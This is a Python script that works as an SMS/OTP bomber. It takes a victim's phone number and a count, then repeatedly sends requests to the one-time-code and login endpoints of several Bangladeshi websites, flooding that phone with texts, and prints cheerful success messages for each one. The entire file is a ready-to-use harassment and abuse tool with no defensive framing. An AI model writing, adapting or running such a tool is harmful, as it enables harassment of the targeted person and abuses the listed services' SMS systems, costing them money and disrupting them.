import requests
from requests.structures import CaseInsensitiveDict

off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black
bred="\033[1;31m"         # Red
bgreen="\033[1;32m"       # Green
byellow="\033[1;33m"      # Yellow
bblue="\033[1;34m"        # Blue
bpurple="\033[1;35m"      # Purple
bcyan="\033[1;36m"        # Cyan
bwhite="\033[1;37m"       # White


print(bred+"""
   ==========≠==========================≠==========
   
         88888888888 Y88b   d88P 8888888888
             888      Y88b d88P  888        
             888       Y88o88P   888        
             888        Y888P    8888888    
             888        d888b    888        
             888       d88888b   888        
             888      d88P Y88b  888        
             888     d88P   Y88b 888        

   ==============================================
""")







number=str(input(byellow+"Enter Your Number(🥰):- "))
amount=int(input(bpurple+"Enter Your Amount(😙):- "+off))

url1 = "http://nesco.sslwireless.com/api/v1/login"
url2 = "http://nesco.sslwireless.com/api/v1/login"
url3 = "https://user.bdapps.com/appstore-v4-server/login/otp/request"
url7 = "https://user.bdapps.com/appstore-v4-server/login/otp/request"
url4 = "https://x10bd.com/api/user/phone/code"
url5 = "https://www.bt8bd.com/requestOTP.do"
url6 = "https://www.abclit.com/student/sendotp"
url8 = "https://www.bazar365.store/api/v1/auth/sendPhoneOtp"
url9 = "https://app.deshal.net/api/auth/login"





headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"
headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/x-www-form-urlencoded"

headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/json"
headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json"
headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/x-www-form-urlencoded"
headers6 = CaseInsensitiveDict()
headers6["Content-Type"] = "application/x-www-form-urlencoded"
headers8 = CaseInsensitiveDict()
headers8["Content-Type"] = "application/json"
headers9 = CaseInsensitiveDict()
headers9["Content-Type"] = "application/json"
headers7 = CaseInsensitiveDict()
headers7["Content-Type"] = "application/json"




data2 = "phone_number="+number
data1 = "phone_number="+number
data3 = '{"msisdn":"88'+number+'"}'
data4 = '{"phone":"88'+number+'"}'
data5 = "mobilePre=880&mobileNo="+number+"&="
data6 = "mobile="+number+"&otp="+number
data7 = '{"msisdn":"88'+number+'"}'
data8 = '{"phone":"'+number+'", "msg":" Hi","applicationChannel":"WEB_APP"}'
data9 = '{"phone": "'+number+'"}'



for i in range(amount):
    resp1 = requests.post(url1, headers=headers1, data=data1)
    print(byellow+resp1.text)
    resp2 = requests.post(url2, headers=headers2, data=data2)
    resp3 = requests.post(url3, headers=headers3, data=data3)
    print(bred+" [>]SP OTP Send Successfully ")
    resp4 = requests.post(url4, headers=headers4, data=data4)
    print(byellow+" [>]Code10 Sms Not Send number blocked")
    resp5 = requests.post(url5, headers=headers5, data=data5)
    resp6 = requests.post(url6, headers=headers6, data=data6)
    print(bgreen+" [>]ABCL OTP Hase Send 😸")
    resp7 = requests.post(url7, headers=headers7, data=data7)
    resp8 = requests.post(url8, headers=headers8, data=data8)
    print(bcyan+" [>]bazar365 sms Send Success")
    resp9 = requests.post(url9, headers=headers9, data=data9)
    print(bpurple+" [>]deshal OTP Hase Send ")
    
    
    
    
    
    